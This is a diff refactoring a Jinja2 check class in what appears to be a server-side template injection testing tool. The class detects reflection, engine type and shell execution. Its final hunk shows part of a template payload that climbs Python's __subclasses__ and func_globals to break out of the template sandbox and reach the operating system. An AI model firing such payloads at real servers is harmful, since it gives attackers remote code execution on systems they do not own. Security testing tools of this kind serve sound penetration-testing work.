@@ -13,26 +13,26 @@ class Jinja2(Check):
         
         self._check_reflection()
         
-        if not self.state.get('reflection'):
+        if not self.get('reflection'):
             return
             
         log.warn('Reflection detected')
         
         self._check_python()
             
-        if not self.state.get('language') or  not self.state.get('engine'):
+        if not self.get('language') or  not self.get('engine'):
             return
             
         log.warn('Python injection detected')   
         
         self._check_os()
         
-        if not self.state.get('exec'):
+        if not self.get('exec'):
             return
             
         log.warn(
             'Shell command execution detected on \'%s\' operating system' % (
-                self.state.get('os', 'undetected')
+                self.get('os', 'undetected')
             )
         )
 
@@ -45,8 +45,8 @@ class Jinja2(Check):
         expected = randA.join(randB)
         
         if expected == self.req(payload):
-            self.state['language'] = 'python'
-            self.state['engine'] = 'jinja2'
+            self.set('language', 'python')
+            self.set('engine', 'jinja2')
     
     def _check_reflection(self):
         
@@ -57,7 +57,7 @@ class Jinja2(Check):
         expected = str(randA*randB)
         
         if expected == self.req(payload):
-            self.state['reflection'] = True
+            self.set('reflection', True)
         
     def _check_os(self):
         
@@ -71,7 +71,7 @@ class Jinja2(Check):
                 
                 
         if expected_rand == self.req(payload):
-            self.state['exec'] = True      
+            self.set('exec', True)      
 
         payload = """{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}
 {% for b in c.__init__.func_globals.values() %} {% if b.__class__ == {}.__class__ %}
@@ -80,4 +80,4 @@ class Jinja2(Check):
 {% endif %} {% endif %} {% endfor %}
 {% endif %} {% endfor %}"""
                 
-        self.state['os'] = self.req(payload) 
+        self.set('os', self.req(payload))
